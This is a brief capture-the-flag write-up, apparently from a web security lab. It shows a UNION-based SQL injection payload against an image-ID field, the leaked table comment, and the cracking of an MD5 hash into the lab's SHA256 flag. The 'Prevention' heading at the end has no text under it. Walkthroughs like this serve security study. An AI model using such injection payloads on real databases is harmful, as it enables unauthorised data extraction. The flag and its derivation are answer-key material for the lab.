```
going further in the webapplication we have another input field the uses the database to fetch images using an image number.

trying random input this time doesnt return any SQL syntax error from the database but still i taught its the same developper who developped this webapp and using the tables name i fetched in the recent SQL injection i made i already got the following table with the following columns : list_images : id -- url -- title -- comment .

so lets try and fetch information from it and see if we can come accross valuable data .

1 or 1 = 1 UNION SELECT t.id, t.comment FROM list_images AS t


ID: 1 or 1 = 1 UNION SELECT t.id, t.comment FROM list_images AS t 
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : 5

1928e8083cf461a51303633093573c46 => albatroz => sh256 => f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```

***Prevention***